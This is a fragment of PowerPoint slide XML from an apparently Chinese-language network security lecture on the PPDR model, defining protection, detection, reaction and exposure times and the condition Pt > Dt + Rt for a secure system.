              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="576" y="1536"/>
              <a:ext cx="3840" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="76200" cap="sq">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd type="triangle" w="med" len="med"/>
              <a:tailEnd type="triangle" w="med" len="med"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="Line 23"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="624" y="3072"/>
              <a:ext cx="1536" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="76200" cap="sq">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd type="triangle" w="med" len="med"/>
              <a:tailEnd type="triangle" w="med" len="med"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="27" name="Line 24"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2304" y="3072"/>
              <a:ext cx="1296" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="76200" cap="sq">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd type="triangle" w="med" len="med"/>
              <a:tailEnd type="triangle" w="med" len="med"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 25"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4088769" y="5484160"/>
            <a:ext cx="4648200" cy="533400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="90000"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="3200" b="0" dirty="0">
                <a:latin typeface="Arial Black" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>新定义：</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="3200" b="0" dirty="0">
                <a:latin typeface="Arial Black" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Pt &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="3200" b="0" dirty="0" err="1">
                <a:latin typeface="Arial Black" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Dt</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="3200" b="0" dirty="0">
                <a:latin typeface="Arial Black" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="3200" b="0" dirty="0" err="1">
                <a:latin typeface="Arial Black" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Rt</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="7200" dirty="0">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33613494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glass.wav"/>
                                        </p:tgtEl>
                                      </p:cMediaNode>
                                    </p:audio>
                                  </p:sub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499"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:se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10"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                  </p:childTnLst>
                                  <p:subTnLst>
                                    <p:audio>
                                      <p:cMediaNode>
                                        <p:cTn display="0" masterRel="sameClick">
                                          <p:stCondLst>
                                            <p:cond evt="begin" delay="0">
                                              <p:tn val="20"/>
                                            </p:cond>
                                          </p:stCondLst>
                                          <p:endCondLst>
                                            <p:cond evt="onStopAudio" delay="0">
                                              <p:tgtEl>
                                                <p:sldTgt/>
                                              </p:tgtEl>
                                            </p:cond>
                                          </p:endCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:sndTgt r:embed="rId4" name="carbrake.wav"/>
                                        </p:tgtEl>
                                      </p:cMediaNode>
                                    </p:audio>
                                  </p:sub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499"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="2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fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="28"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31"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C0CB14F-A5AD-DA48-90E4-0CF68F8ACC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4496" y="3212976"/>
            <a:ext cx="4499992" cy="1936976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81922" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="721702"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>模型中的数学法则</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81923" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="595598" y="1304620"/>
            <a:ext cx="8368890" cy="540204"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>假设</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>系统的防护、检测和反应的时间关系如下：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348302" y="2027648"/>
            <a:ext cx="7444772" cy="1677382"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Pt=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>防护时间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>有效防御攻击的时间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dt=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>检测时间（发起攻击到检测到的时间）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Rt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>反应时间（检测到攻击到处理完成时间）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Et=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>暴露时间</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="122225" y="5085184"/>
            <a:ext cx="7204149" cy="1292662"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>则该系统防护、检测和反应的时间关系如下：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Pt</a:t>
            </a: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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dt</a:t>
            </a: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dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Rt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>，那么</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>是安全的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Pt</a:t>
            </a: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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dt</a:t>
            </a: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dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Rt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>，那么</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Et</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>＝</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(Dt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>＋</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Rt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>－</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Pt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200"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14735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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="819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P spid="2" grpId="0"/>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934244" y="764704"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>模型的安全目标</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82947" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="2355326"/>
            <a:ext cx="7560840" cy="287515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a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>在统一安全策略的控制下</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>在综合运用防护工具基础上</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>利用检测工具检测评估网络系统的安全状态</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>通过及时的响应措施将网络系统调整到风险最低的安全状态</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82948" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="959910" y="1555107"/>
            <a:ext cx="6156176"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依据</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>PPDR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>模型构筑的网络安全体系</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16673007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948"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="82948"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="829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82947">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
